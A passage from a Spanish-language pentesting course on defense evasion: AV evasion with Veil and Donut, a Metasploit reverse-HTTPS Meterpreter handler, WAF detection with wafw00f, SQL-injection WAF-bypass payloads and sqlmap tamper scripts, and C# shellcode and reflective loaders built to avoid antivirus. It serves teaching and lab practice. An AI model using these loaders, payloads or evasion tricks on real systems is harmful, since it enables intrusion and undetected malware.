| **Inicio**         | **atrás 4**                                                      | **Siguiente 6**                                          |
| ------------------ | ---------------------------------------------------------------- | -------------------------------------------------------- |
| [🏠](../README.md) | [⏪](./5_4_Hacking_avanzado_de_aplicaciones_web_y_bug_bounty.md) | [⏩](./5_6_Hacking_etico_y_post_explotacion_avanzada.md) |

---

## **Índice**

| Temario                                                                                                                   |
| ------------------------------------------------------------------------------------------------------------------------- |
| [341. Introducción a la evasión de defensas](#341-introducción-a-la-evasión-de-defensas)                                  |
| [342. Load Balancing detector: halberd](#342-load-balancing-detector-halberd)                                             |
| [343. WAF detector: wafw00f](#343-waf-detector-wafw00f)                                                                   |
| [344. Evasión de WAF](#344-evasión-de-waf)                                                                                |
| [345. Otras soluciones para evasión de WAF](#345-otras-soluciones-para-evasión-de-waf)                                    |
| [346. Evasión de antivirus con C#](#346-evasión-de-antivirus-con-c)                                                       |
| [347. Otras técnicas de evasión con C#](#347-otras-técnicas-de-evasión-con-c)                                             |
| [348. Evasión de detección en tiempo de ejecución](#348-evasión-de-detección-en-tiempo-de-ejecución)                      |
| [349. Evasión con GreatSCT](#349-evasión-con-greatsct)                                                                    |
| [350. Evasión con TheFatRat](#350-evasión-con-thefatrat)                                                                  |
| [351. Otras herramientas de evasión: Veil, Shellter, MSFManía](#351-otras-herramientas-de-evasión-veil-shellter-msfmanía) |

---

# **Deteccion y Evasion de defensas**

## **341. Introducción a la evasión de defensas**

### 🔍 ¿Qué es?

La evasión de defensas es el **conjunto de técnicas** usadas por atacantes (o pentesters éticos) para **ocultar sus actividades** de los sistemas de seguridad, como:

- **Antivirus (AV)**
- **EDR (Endpoint Detection and Response)**
- **Firewalls**
- **SIEMs (Security Information and Event Management)**

> 🎯 El objetivo es evitar ser detectado durante o después de una intrusión.

---

### 🧠 ¿Por qué es importante?

Aunque consigas acceso a un sistema, **si te detectan**, tu ataque puede ser **bloqueado o rastreado rápidamente**. Por eso, los pentesters y red teamers aprenden técnicas de evasión para:

- **Ejecutar payloads sin ser detectados**
- **Mantener persistencia**
- **Exfiltrar datos sin alertas**

---

### 🧰 Técnicas comunes de evasión

| Técnica                      | Explicación                                        | Ejemplo                                                |
| ---------------------------- | -------------------------------------------------- | ------------------------------------------------------ |
| Obfuscación                  | Ocultar el código malicioso con encoding o cifrado | Codificar en Base64 un script malicioso                |
| Living Off the Land (LOLBin) | Usar herramientas del propio sistema operativo     | Ejecutar malware usando `powershell.exe` o `mshta.exe` |
| Bypass UAC                   | Evitar el control de cuentas de usuario            | Ejecutar comandos con privilegios sin alerta           |
| Shellcode injection          | Cargar código directamente en memoria              | Inyección con herramientas como `Donut`                |
| Firma polimórfica            | Cambiar el código para evadir firmas AV            | Meterpreter con diferentes codificaciones              |

---

### 🛠️ Herramientas comunes para evasión

| Herramienta            | Uso                                     |
| ---------------------- | --------------------------------------- |
| **Veil**               | Genera payloads que evaden AV           |
| **Donut**              | Crea shellcode de ejecutables .NET o PE |
| **Shellter**           | Infecta archivos legítimos con payload  |
| **Invoke-Obfuscation** | Ofusca scripts PowerShell               |
| **Nimcrypt2**          | Evasión basada en lenguaje Nim          |

---

### 🔧 Instalación de herramientas de evasión

Te muestro cómo instalar **Veil** y **Donut**, dos herramientas esenciales.

---

#### ✅ Veil Framework

**Requisitos**: Kali Linux recomendado

```bash
git clone https://github.com/Veil-Framework/Veil.git
cd Veil/
./config/setup.sh --force --silent
```

Esto instalará todas las dependencias y configurará Veil.

📌 Ejecutar:

```bash
./Veil.py
```

---

#### ✅ Donut

**Crea shellcode desde archivos PE o .NET**

```bash
git clone https://github.com/TheWover/donut.git
cd donut
mkdir build && cd build
cmake ..
make
```

Uso básico:

```bash
./donut /ruta/a/malware.exe
```

Esto generará un `shellcode` que puedes inyectar en memoria con otras herramientas como Cobalt Strike o msfvenom.

---

### 🎯 Ejemplo completo: Evasión simple con Veil

#### 🎬 Escenario:

Quieres entregar un **payload meterpreter** que no sea detectado por un antivirus común.

#### 🪛 Paso a paso:

##### 1. Iniciar Veil

```bash
cd Veil
./Veil.py
```

##### 2. Elegir Payload

Selecciona:

```
[1] powershell/meterpreter/rev_https
```

##### 3. Configurar IP y Puerto

- LHOST = Tu IP
- LPORT = Puerto (por ejemplo, 443)

##### 4. Generar

Veil te generará un archivo `.bat` o `.ps1` con el payload **ofuscado y cifrado**.

##### 5. Transferirlo al objetivo (de forma simulada)

Puedes copiar este archivo a un Windows y ver que muchos antivirus **no lo detectan** (dependiendo del AV).

---

#### 💡 Nota: siempre usa estas herramientas en entornos controlados o con permisos.

---

### 🧪 Simulación en entorno seguro

Supón que tienes una **máquina Windows virtual** y una **Kali Linux** como atacante.

1. En Kali, generas el payload con Veil.
2. Configuras el `multi/handler` en Metasploit:

```bash
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set LHOST TU_IP
set LPORT 443
run
```

3. Ejecutas el payload en la VM Windows.

✅ Resultado: se abre una **sesión Meterpreter**, y **el antivirus no lo detectó**.

---

### 🚨 Consejos finales

- No todos los antivirus son iguales. Algunos detectan más rápido que otros.
- La evasión cambia constantemente. Lo que hoy funciona, mañana puede ser detectado.
- Usa sandbox o entornos virtualizados para hacer pruebas.
- Entiende cómo funciona el sistema defensivo (logs, detección heurística, comportamiento, etc.)

---

[🔼](#índice)

---

## **342. Load Balancing detector: halberd**

### ✅ ¿Qué es Halberd?

**Halberd** es una herramienta de código abierto usada para detectar si un servidor web está detrás de un **balanceador de carga**. Su propósito es ayudar a identificar cuántos servidores se encuentran realmente detrás de un nombre de dominio (por ejemplo, `www.ejemplo.com`) o dirección IP.

Esto es útil, por ejemplo, en **ciberseguridad**, **pentesting**, o **auditorías de red**, ya que si una empresa tiene múltiples servidores detrás de un balanceador, un atacante o auditor puede querer saberlo para planear un escaneo más detallado o saber qué IPs distintas podrían responder.

---

### 🧠 ¿Qué hace Halberd?

Halberd funciona haciendo múltiples peticiones al mismo dominio y **analiza las respuestas HTTP**. Compara ciertos encabezados (headers) y comportamientos para intentar distinguir si diferentes servidores están respondiendo.

Algunas cosas que puede revisar:

- Cabeceras HTTP como `Server`, `Set-Cookie`, etc.
- Diferencias en la latencia
- Cambios en la respuesta de contenido

---

### 🛠️ ¿Cómo instalar Halberd?

#### ✅ Requisitos previos:

- Tener **Python** instalado (preferiblemente 3.x)
- Tener **pip** (el gestor de paquetes de Python)

---

#### 💻 Instalación en Linux (como Kali o Ubuntu):

```bash
sudo apt update
sudo apt install git python3-pip -y
git clone https://github.com/jmaddock/halberd.git
cd halberd
pip3 install -r requirements.txt
```

---

#### 💻 Instalación en Windows:

1. Asegúrate de tener Python instalado desde: [https://www.python.org/downloads/](https://www.python.org/downloads/)
2. Abre PowerShell o CMD:

```powershell
git clone https://github.com/jmaddock/halberd.git
cd halberd
pip install -r requirements.txt
```

> Nota: Si no tienes `git`, puedes descargar el ZIP desde GitHub y extraerlo.

---

### ▶️ ¿Cómo usar Halberd?

Una vez instalado, puedes ejecutar Halberd así:

```bash
python3 halberd.py <target>
```

#### 📌 Ejemplo sencillo:

```bash
python3 halberd.py www.google.com
```

Este comando realizará varias solicitudes HTTP a `www.google.com` y analizará las respuestas para ver si hay varios servidores web detrás de ese dominio.

---

#### 📥 Salida esperada (ejemplo):

```bash
www.google.com seems to be served by 3 web servers.
Server A: headers x,y,z
Server B: headers x,y,z
Server C: headers x,y,z
```

Esto indica que hay al menos **3 servidores** distintos detrás del nombre de dominio, lo que sugiere que **Google usa balanceo de carga** (como es de esperarse).

---

### 🎯 Ejemplo completo paso a paso

#### Supongamos que quieres analizar `www.cloudflare.com`:

1. Ve al directorio donde clonaste halberd:

```bash
cd halberd
```

2. Ejecuta el análisis:

```bash
python3 halberd.py www.cloudflare.com
```

3. Espera a que termine. Verás una salida parecida a:

```
[*] Starting tests for: www.cloudflare.com
[*] Testing HTTP responses...
[*] Collecting server signatures...
[+] Detected at least 2 distinct servers.
Server 1 signature: Header: Cloudflare, Cookie: __cfduid
Server 2 signature: Header: Cloudflare, Cookie: __cf_bm
```

Esto significa que **hay dos servidores distintos** respondiendo peticiones, con **diferentes cookies o headers**, lo que confirma la presencia de un **balanceador de carga**.

---

### 🎁 Bonus: Uso de Halberd en modo silencioso o con logs

- Si quieres **guardar los resultados en un archivo de log**:

```bash
python3 halberd.py www.example.com > resultado.txt
```

---

### ⚠️ Limitaciones

- Halberd **no detecta todos los tipos de balanceo de carga**, especialmente si el balanceo está basado en capa 4 (nivel TCP/IP).
- Puede generar **falsos positivos** si el servidor cambia headers de manera aleatoria.
- Algunos sitios muy grandes usan **técnicas avanzadas de caching o CDN (como Cloudflare)** que pueden ocultar estos detalles.

---

### ✅ En resumen:

| Característica       | Descripción                           |
| -------------------- | ------------------------------------- |
| 🧩 ¿Qué hace?        | Detecta balanceadores de carga web.   |
| 🔧 ¿Cómo se instala? | Usando `git clone` y `pip install`    |
| 💻 ¿Cómo se usa?     | `python3 halberd.py <sitio>`          |
| 📍 Resultado típico  | “Detectados 2-3 servidores distintos” |

---

[🔼](#índice)

---

## **343. WAF detector: wafw00f**

### 🧠 ¿Qué es un WAF y qué hace wafw00f?

#### ✅ ¿Qué es un WAF?

Un **WAF (Web Application Firewall)** es un tipo de firewall que protege aplicaciones web contra ataques como:

- Inyecciones SQL
- XSS (cross-site scripting)
- Path traversal
- Peticiones maliciosas

**Funciona filtrando y monitoreando el tráfico HTTP/HTTPS** entre una aplicación web y el mundo exterior.

---

#### 🛠️ ¿Qué es wafw00f?

**`wafw00f`** es una herramienta de código abierto desarrollada por el proyecto **OWASP** que detecta automáticamente si una aplicación web está protegida por un WAF, y en muchos casos **identifica cuál WAF** se está usando.

Utiliza técnicas como:

- Enviar peticiones HTTP especialmente formadas
- Analizar respuestas (headers, códigos, contenidos, cookies)
- Comparar contra una base de datos de firmas de WAFs conocidos

---

### 🚀 ¿Para qué sirve wafw00f?

- 🕵️‍♂️ Pentesters: Para saber si un objetivo está protegido antes de lanzar un escaneo o ataque.
- 🔐 Seguridad defensiva: Para verificar que el WAF está bien configurado.
- 🎯 Ciberseguridad ofensiva: Para planificar bypasses o ataques evasivos.

---

### 💻 ¿Cómo se instala wafw00f?

#### 📦 Requisitos:

- Python (preferiblemente 3.x)
- pip (gestor de paquetes de Python)

---

#### 🔽 Instalación en Linux (Kali, Ubuntu, Debian, etc.)

```bash
sudo apt update
sudo apt install python3-pip git -y
git clone https://github.com/EnableSecurity/wafw00f.git
cd wafw00f
pip3 install .
```

> Si estás en Kali Linux, **ya viene preinstalado** por defecto: puedes ejecutar `wafw00f` directamente.

---

#### 🪟 Instalación en Windows

1. Asegúrate de tener Python y pip instalados desde: [https://www.python.org](https://www.python.org)
2. Abre PowerShell o CMD y ejecuta:

```powershell
git clone https://github.com/EnableSecurity/wafw00f.git
cd wafw00f
pip install .
```

> También puedes instalar directamente desde PyPI:

```bash
pip install wafw00f
```

Y luego correrlo así:

```bash
wafw00f <sitio>
```

---

### 🧪 ¿Cómo se usa wafw00f?

#### 📌 Sintaxis básica:

```bash
wafw00f http://ejemplo.com
```

También funciona con HTTPS:

```bash
wafw00f https://www.ejemplo.com
```

---

#### ⚙️ Opciones útiles:

| Opción         | Descripción                                                           |
| -------------- | --------------------------------------------------------------------- |
| `-a`           | Muestra **todas las firmas** de WAFs que podrían estar presentes.     |
| `-v`           | Modo **verbose** (más detalles).                                      |
| `-r <archivo>` | Escanea múltiples URLs desde un archivo.                              |
| `--findall`    | Trata de identificar **todos los WAFs posibles**, no solo el primero. |

---

### ✅ Ejemplo completo paso a paso

#### 🎯 Escanear un sitio con protección como Cloudflare

1. Abre tu terminal y ejecuta:

```bash
wafw00f https://www.cloudflare.com
```

2. Esperas unos segundos…

3. **Salida esperada:**

```bash
Checking https://www.cloudflare.com
The site https://www.cloudflare.com is behind a WAF.
WAF Detected: Cloudflare (Cloudflare)
```

Esto indica que el sitio está **protegido por un WAF de Cloudflare**.

---

#### 🧪 Ejemplo con más detalle (`-v`)

```bash
wafw00f -v https://www.cloudflare.com
```

Verás algo como:

```
[*] Starting wafw00f on https://www.cloudflare.com
[*] Performing checks...
[*] Sending normal HTTP request
[*] Sending malicious request to trigger WAF
[+] WAF detected: Cloudflare
```

---

#### 📂 Ejemplo con lista de sitios (archivo)

1. Crea un archivo `targets.txt`:

```
https://www.cloudflare.com
https://www.google.com
http://testphp.vulnweb.com
```

2. Ejecuta wafw00f:

```bash
wafw00f -r targets.txt
```

3. Verás los resultados para cada sitio.

---

### 🧠 ¿Cómo lo detecta?

Algunas de las técnicas:

- Cambios en los códigos de estado (403, 406, 501)
- Headers típicos como:

  - `Server: cloudflare`
  - `X-Sucuri-ID`, `X-Akamai-Transformed`, etc.

- Cookies específicas de WAFs
- Mensajes de error tipo: `"Access Denied"` o `"Request blocked"`

---

### 🛡️ ¿Qué WAFs puede detectar wafw00f?

Aquí algunos ejemplos:

| WAF Detectable       | Empresa            |
| -------------------- | ------------------ |
| Cloudflare           | Cloudflare         |
| AWS WAF              | Amazon             |
| Sucuri CloudProxy    | GoDaddy            |
| Akamai               | Akamai             |
| F5 BIG-IP ASM        | F5 Networks        |
| Fortinet FortiWeb    | Fortinet           |
| ModSecurity          | OWASP              |
| Imperva SecureSphere | Imperva            |
| Barracuda            | Barracuda Networks |

Hay más de **100 firmas diferentes** en la base de datos de `wafw00f`.

---

### 📌 En resumen

| Concepto           | Descripción                                    |
| ------------------ | ---------------------------------------------- |
| 🔍 ¿Qué hace?      | Detecta si un sitio tiene WAF y cuál           |
| 💻 ¿Cómo instalar? | `git clone` y `pip install .`                  |
| 🧪 ¿Cómo usar?     | `wafw00f https://sitio.com`                    |
| 🛡️ ¿Qué detecta?   | Cloudflare, Sucuri, AWS WAF, ModSecurity, etc. |

---

### 🚀 ¿Quieres probar tú mismo?

Te recomiendo probar con sitios como:

```bash
wafw00f https://www.cloudflare.com
wafw00f http://testphp.vulnweb.com
```

Y luego ver qué WAF (si hay) los protege.

---

[🔼](#índice)

---

## **344. Evasión de WAF**

### 🧠 ¿Qué es la evasión de WAF?

La **evasión de WAF** se refiere a las técnicas que se utilizan para **burlar o evitar la detección** de un **Web Application Firewall (WAF)**.

Un WAF actúa como un guardia que analiza y bloquea solicitudes HTTP sospechosas. Por ejemplo:

- Si intentas enviar `SELECT * FROM users`, lo más probable es que el WAF lo detecte como un intento de inyección SQL y lo bloquee.

**Pero la evasión consiste en camuflar esa petición** para que el WAF no la detecte, pero que el servidor backend (base de datos o aplicación) sí la entienda y la ejecute.

---

### 🔍 ¿Cómo funciona un WAF?

Los WAFs se basan en una combinación de:

- **Firmas estáticas** (palabras clave sospechosas como `UNION`, `' OR 1=1 --`)
- **Listas negras** y **listas blancas**
- **Análisis de patrones regulares (regex)**
- **Reputación IP o geográfica**
- **Análisis de comportamiento**

---

### 🛠️ ¿Cómo se instalan o configuran WAFs?

Solo como referencia educativa, hay muchos WAFs disponibles:

| WAF            | Tipo        | Ejemplo de uso    |
| -------------- | ----------- | ----------------- |
| ModSecurity    | Open Source | Apache, Nginx     |
| Cloudflare WAF | Cloud       | DNS proxy         |
| AWS WAF        | Cloud       | Amazon ALB/API GW |
| F5 BIG-IP ASM  | Hardware    | Empresas grandes  |

> Para probar evasiones legalmente, puedes instalar tu propio **ModSecurity con OWASP Juice Shop** o `DVWA`.

---

### 🧪 Técnicas comunes de evasión WAF (con ejemplos)

Ahora sí, veamos ejemplos sencillos de cómo se puede evadir un WAF:

---

#### 📌 1. **Codificación de caracteres**

Reemplazar caracteres especiales por sus equivalentes codificados (hex, unicode, URL).

##### Original:

```sql
SELECT * FROM users WHERE username = 'admin'
```

##### Evasión:

```sql
SELECT%20*%20FROM%20users%20WHERE%20username%20=%20%27admin%27
```

O incluso usando Unicode:

```sql
S%E2%80%8BLE%E2%80%8BECT * FROM users
```

🧠 **WAFs que no normalizan bien el input podrían dejarlo pasar**.

---

#### 📌 2. **Uso de comentarios en SQL**

##### Original:

```sql
admin' OR '1'='1
```

##### Evasión:

```sql
admin'/**/OR/**/'1'='1
```

🧠 Algunos WAFs no procesan los `/**/` como parte del código.

---

#### 📌 3. **Uso de palabras divididas**

Dividir palabras clave en varias partes para evadir firmas de detección:

```sql
UN/**/ION SEL/**/ECT username FROM users
```

---

#### 📌 4. **Case manipulation (cambios en mayúsculas/minúsculas)**

Algunos WAFs solo detectan palabras clave en minúsculas.

```sql
SeLeCt * fRoM users
```

---

#### 📌 5. **Uso de caracteres especiales alternativos**

Inyectar control characters o espacios no comunes (`%09`, `%0a`, `%0b`, etc.)

```sql
SELECT%09*%09FROM%09users
```

---

#### 📌 6. **Uso de Headers alternativos**

Algunos WAFs analizan solo ciertos headers. Puedes cambiar el `User-Agent`, `X-Original-URL`, `X-Forwarded-For`, etc.

```bash
curl -H "X-Original-URL: /admin" https://victima.com
```

---

### ⚠️ Muy importante

🔒 **Este conocimiento debe usarse solo en laboratorios, entornos legales o pruebas de pentesting con permiso.**
Ejecutar estas técnicas contra sistemas ajenos **sin autorización** es **ilegal**.

---

### 🧪 ¿Dónde practicar evasión de WAF legalmente?

Puedes montar estos laboratorios en tu PC o usar servicios online:

| Plataforma                   | Descripción                     |
| ---------------------------- | ------------------------------- |
| **DVWA**                     | Damn Vulnerable Web App         |
| **bWAPP**                    | Buggy Web App                   |
| **OWASP Juice Shop**         | Pruebas de seguridad en Node.js |
| **Hack The Box / TryHackMe** | Laboratorios guiados            |

---

### 🧪 Ejemplo completo: evasión de WAF en DVWA

#### 🎯 Objetivo

Evadir el filtro de inyección SQL en el formulario de login de **DVWA** con nivel de seguridad "high".

---

#### 🔧 Paso 1: Configura tu entorno local

1. Instala **DVWA** en XAMPP o Docker.
2. Accede a `http://localhost/dvwa`
3. Cambia el nivel de seguridad a "High"

---

#### 🔧 Paso 2: Prueba el payload normal (bloqueado)

```sql
' OR '1'='1
```

Esto debería dar **"Login failed"**.

---

#### 🔧 Paso 3: Usa una técnica de evasión

```sql
%27/**/OR/**/'1'%3D'1
```

✅ Al enviarlo como input, **el backend lo interpreta correctamente**, pero el WAF puede no detectarlo por los comentarios y codificación.

Resultado esperado: **Login exitoso** (si el backend es vulnerable y el WAF es débil).

---

### ✅ En resumen

| Tema                 | Descripción clara                                                  |
| -------------------- | ------------------------------------------------------------------ |
| 🎯 ¿Qué es?          | Técnicas para evitar que el WAF bloquee una solicitud maliciosa    |
| 🔎 ¿Cómo se hace?    | Usando codificación, manipulación de palabras clave, headers, etc. |
| 🛡️ ¿Dónde practicar? | DVWA, bWAPP, Juice Shop, Hack The Box                              |
| ⚠️ Ética             | Solo en entornos legales con permiso                               |

---

[🔼](#índice)

---

## **345. Otras soluciones para evasión de WAF**

### 🛡️ Repaso breve: ¿Qué es un WAF?

Un **WAF (Web Application Firewall)** protege aplicaciones web analizando peticiones HTTP y bloqueando las maliciosas, como:

- Inyección SQL
- XSS
- File inclusion
- Directory traversal

La **evasión de WAF** consiste en **modificar la petición maliciosa** para que pase desapercibida por el WAF pero aún así sea interpretada correctamente por la aplicación web.

---

### ❓¿Por qué buscar otras soluciones?

Porque muchos WAFs modernos detectan los patrones tradicionales como:

```
' OR '1'='1
<script>alert(1)</script>
```

Entonces necesitamos herramientas que nos ayuden a **automatizar la evasión**, probar múltiples variantes y descubrir posibles brechas que el WAF no está cubriendo.

---

### 🔧 Herramientas para evasión de WAF

#### 1. **SQLMap** (con evasión activada)

**SQLMap** no solo automatiza inyecciones SQL, también incluye funciones para **evadir WAFs** con técnicas incorporadas.

##### Instalación:

```bash
git clone https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
python3 sqlmap.py --help
```

##### Evasión de WAF:

```bash
python3 sqlmap.py -u "http://example.com/page.php?id=1" --tamper=space2comment
```

> Usa el script de evasión `space2comment`, que reemplaza espacios por comentarios `/**/`.

---

#### 2. **Commix** – Inyección de comandos con evasión

Detecta y explota vulnerabilidades de inyección de comandos con técnicas evasivas.

##### Instalación:

```bash
git clone https://github.com/commixproject/commix.git
cd commix
python3 commix.py --help
```

##### Uso básico:

```bash
python3 commix.py --url="http://target.com/page.php?input=xyz" --tamper=space2comment
```

---

#### 3. **Burp Suite + Extensiones**

Burp Suite es un **proxy para pruebas de seguridad web**. Puedes interceptar y modificar manualmente las solicitudes para evadir el WAF.

##### Solución combinada:

- Usa Burp para capturar la solicitud
- Cambia el payload a una forma evasiva:
  `admin' OR '1'='1` → `admin%27/**/OR/**/%271%27=%271`

También puedes usar extensiones como:

- **Bypass WAF**
- **Turbo Intruder** para generar miles de variantes

---

#### 4. **Tamper Scripts de SQLMap**

SQLMap tiene más de 40 scripts que modifican dinámicamente el payload para evadir detección.

Ejemplos de scripts:

| Script              | ¿Qué hace?                              |
| ------------------- | --------------------------------------- |
| `space2comment`     | Convierte espacios en `/**/`            |
| `between`           | Usa la cláusula BETWEEN para evadir `=` |
| `charunicodeencode` | Codifica caracteres en Unicode          |
| `randomcase`        | Cambia mayúsculas/minúsculas            |
| `equaltolike`       | Reemplaza `=` por `LIKE`                |

Se pueden combinar:

```bash
--tamper=space2comment,randomcase,equaltolike
```

---

### 🔍 Técnicas adicionales (no herramientas)

#### 1. **Uso de Headers HTTP alternativos**

Algunos servidores interpretan `X-Original-URL` o `X-Forwarded-For`.

```bash
curl -H "X-Original-URL: /admin" https://target.com/
```

#### 2. **Encoding múltiple (Double Encoding)**

```sql
%2527 OR 1=1 --  (→ %27 OR 1=1 -- → ' OR 1=1 --)
```

#### 3. **Payloads anidados o fragmentados**

Algunos WAFs no siguen cadenas correctamente si están partidas:

```sql
UNION SEL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F
```

---

[🔼](#índice)

---

## **346. Evasión de antivirus con C#**

### 🧠 ¿Qué es la evasión de antivirus?

Es el proceso de **modificar el comportamiento, estructura o firma de un archivo malicioso** (por ejemplo, un ejecutable `.exe`) para que **no sea detectado por un antivirus**.

Los antivirus modernos usan:

- **Firmas estáticas**: patrones binarios conocidos.
- **Análisis heurístico**: comportamiento sospechoso.
- **Emulación/sandboxing**: ejecución segura para observar.
- **Machine learning**: predicción de nuevas amenazas.

---

### 🎯 ¿Por qué aprender esto?

1. **Pentesters** y **red teamers** usan estas técnicas en entornos controlados para evaluar la protección antivirus.
2. Los **analistas forenses** necesitan entender cómo evadir técnicas de ocultación.
3. Los **desarrolladores** de seguridad deben conocerlas para mejorar sus defensas.

---

### 🔐 Advertencia ética y legal

> ⚠️ Todo lo que se expone aquí es **con fines educativos y de laboratorio**.
>
> Nunca debes utilizar estos conocimientos para desarrollar malware real o evadir defensas en sistemas sin autorización.
>
> Hacerlo es **ilegal** y puede conllevar **graves consecuencias legales**.

---

### 🛠️ Requisitos para practicar de forma legal y segura

Puedes usar:

- 🖥️ Una **máquina virtual Windows** con antivirus instalado.
- 🧪 Antivirus gratuito como **Windows Defender**.
- 🧰 Herramientas como:

  - `Visual Studio`
  - `Detect It Easy` o `PEStudio` (análisis de archivos)
  - `Procmon`, `Wireshark` o `Process Hacker`

---

### 🧰 Técnicas comunes de evasión (en C#)

Veamos algunas técnicas, **con ejemplos sencillos en C#**.

---

#### 📌 1. **Ofuscación de cadenas**

Los antivirus detectan cadenas como `"cmd.exe"`, `"powershell"` o `"Add-MpPreference"`. Puedes ocultarlas:

```csharp
string c = "c" + "m" + "d" + ".exe";
System.Diagnostics.Process.Start(c);
```

O en Base64:

```csharp
string encoded = "Y21kLmV4ZQ=="; // base64 de "cmd.exe"
string decoded = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(encoded));
System.Diagnostics.Process.Start(decoded);
```

---

#### 📌 2. **Compilación personalizada / Sin firma común**

El antivirus detecta ejecutables con ciertas características del compilador. Si usas **compiladores alternativos o cambias los metadatos**, reduces la probabilidad de detección.

En C#, puedes compilar con Roslyn o MSBuild en tiempo de ejecución.

---

#### 📌 3. **Carga dinámica de código (reflective loading)**

Evitar escribir archivos al disco. Por ejemplo, cargar código en memoria con `Assembly.Load()`:

```csharp
byte[] exeBytes = File.ReadAllBytes("payload.exe");
Assembly asm = Assembly.Load(exeBytes);
MethodInfo entry = asm.EntryPoint;
entry.Invoke(null, new object[] { new string[] { } });
```

Esto **evita que el antivirus escanee el ejecutable en disco**.

---

#### 📌 4. **Uso de técnicas de “sleep” o “delay”**

Algunos antivirus analizan solo los primeros segundos de ejecución. Puedes usar técnicas como:

```csharp
System.Threading.Thread.Sleep(10000); // Espera 10 segundos
```

---

#### 📌 5. **Uso de Shellcode + Cargador en C# (más avanzado)**

Esto simula una técnica de ataque real. Ejemplo simplificado:

```csharp
[DllImport("kernel32")]
static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32")]
static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

byte[] shellcode = new byte[] { 0xfc, 0x48, 0x83, 0xe4, ... }; // shellcode generado con msfvenom
IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x1000, 0x40);
Marshal.Copy(shellcode, 0, addr, shellcode.Length);
CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
```

Este método **inyecta código directamente en memoria**, evitando detección basada en disco.

> ⚠️ **Este tipo de técnica debe usarse solo en entornos de laboratorio, nunca contra objetivos reales sin permiso.**

---

### 🔧 ¿Cómo compilar en C#?

1. Instala **Visual Studio Community** o usa `dotnet CLI`.
2. Usa un archivo `.cs` y compílalo:

```bash
csc.exe archivo.cs
```

O con .NET 6+:

```bash
dotnet new console -n evasor
dotnet build
```

---

### ✅ Ejemplo completo: evasión básica con cadena ofuscada

#### 🧾 Código fuente (archivo: `evasor.cs`)

```csharp
using System;
using System.Diagnostics;
using System.Text;

class Program {
    static void Main() {
        string b64 = "Y21kLmV4ZQ=="; // "cmd.exe"
        string decoded = Encoding.UTF8.GetString(Convert.FromBase64String(b64));

        Process.Start(new ProcessStartInfo {
            FileName = decoded,
            Arguments = "/c calc.exe",
            CreateNoWindow = true,
            UseShellExecute = false
        });
    }
}
```

---

#### ⚙️ Cómo compilar:

```bash
csc evasor.cs
```

Luego ejecuta `evasor.exe`. Este abrirá la calculadora (calc.exe), pero el antivirus puede no detectarlo si no inspecciona la cadena codificada.

---

### 🧪 ¿Dónde probar estas técnicas?

Crea una VM en:

- 🧰 **VirtualBox / VMware**
- 💻 Instala **Windows Defender**
- 🧪 Usa **Procmon** para ver qué ejecuta

---

### 🛡️ ¿Cómo defenderte de esto?

Como blue team o defensor:

- Usa **antivirus con sandboxing dinámico**
- Implementa **monitoring con EDR (Microsoft Defender ATP, CrowdStrike)**
- Monitorea procesos que lanzan `cmd.exe`, `powershell`, `mshta`, `regsvr32`, etc.
- Usa herramientas como **YARA** o **Sysmon**

---

### ✅ En resumen

| Tema                | Detalle                                                     |
| ------------------- | ----------------------------------------------------------- |
| ¿Qué es?            | Ocultar código malicioso de antivirus usando técnicas en C# |
| Técnicas vistas     | Ofuscación de cadenas, ejecución en memoria, codificación   |
| Herramientas útiles | Visual Studio, Procmon, PEStudio                            |
| Ejemplo dado        | Base64 + ejecución de cmd.exe con C#                        |
| Recomendación       | Probar solo en entornos virtuales, legales y controlados    |

---

[🔼](#índice)

---

## **347. Otras técnicas de evasión con C#**

### 🛡️ ¿Qué son técnicas de evasión en C#?

Son métodos para modificar o camuflar un programa malicioso (como un backdoor, reverse shell, etc.) de manera que:

- No sea detectado por antivirus.
- No se bloquee al momento de la ejecución.
- No dispare alertas de seguridad.

---

### 🔧 Otras técnicas comunes (además de las que ya vimos)

#### ✅ 1. **Uso de `System.Reflection` para ejecutar payloads en memoria**

Evita escribir archivos al disco. En lugar de ejecutar directamente un `.exe`, se carga en memoria como un ensamblado (Assembly).

```csharp
using System;
using System.Reflection;

class Program
{
    static void Main()
    {
        byte[] exeBytes = System.IO.File.ReadAllBytes("payload.exe");
        Assembly asm = Assembly.Load(exeBytes);
        MethodInfo entryPoint = asm.EntryPoint;
        object instance = asm.CreateInstance(entryPoint.Name);
        entryPoint.Invoke(instance, new object[] { new string[] { } });
    }
}
```

📌 Este enfoque **no escribe nada al disco** cuando el payload ya está incrustado o descargado en memoria.

---

#### ✅ 2. **Uso de `DllImport` para usar APIs de Windows (P/Invoke)**

Permite inyectar shellcode en memoria usando funciones nativas de Windows.

```csharp
using System;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    static void Main()
    {
        byte[] shellcode = new byte[] { 0xfc, 0x48, 0x83, 0xe4, ... }; // shellcode generado por msfvenom

        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x1000 | 0x2000, 0x40);
        Marshal.Copy(shellcode, 0, addr, shellcode.Length);
        CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
    }
}
```

🧠 Esta técnica es conocida como **reflective shellcode loading**.

---

#### ✅ 3. **Uso de recursos incrustados para ocultar payloads**

Incrustas el payload (por ejemplo, shellcode o exe) como un recurso `.resx` o binario en el ejecutable.

```csharp
// El payload está en Properties.Resources.payload_bin
byte[] payload = Properties.Resources.payload_bin;
Assembly asm = Assembly.Load(payload);
asm.EntryPoint.Invoke(null, new object[] { new string[] { } });
```

